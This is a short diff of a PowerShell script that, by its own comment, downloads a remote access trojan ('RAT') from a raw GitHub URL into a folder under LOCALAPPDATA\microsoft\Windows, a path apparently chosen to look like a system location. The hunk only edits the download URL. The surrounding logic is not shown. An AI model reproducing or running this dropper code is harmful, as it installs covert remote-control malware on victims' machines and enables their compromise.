@@ -36,7 +36,7 @@ if (-not (Test-Connection -Count 1 -Quiet github.com)) {
 
 # Download the RAT to appdata\local
 $Save2Path = "$env:LOCALAPPDATA\microsoft\Windows\"
-$URL = "https://raw.githubusercontent.com/NetConnectors/4seShitzNGiggles/refs/heads/main/n/giggles.ps1"
+$URL = "https://raw.githubusercontent.com/NetConnectors/4seShitzNGiggles/main/n/giggles.ps1"
 
 # Check if the directory exists
 if (-not (Test-Path -Path $Save2Path)) {
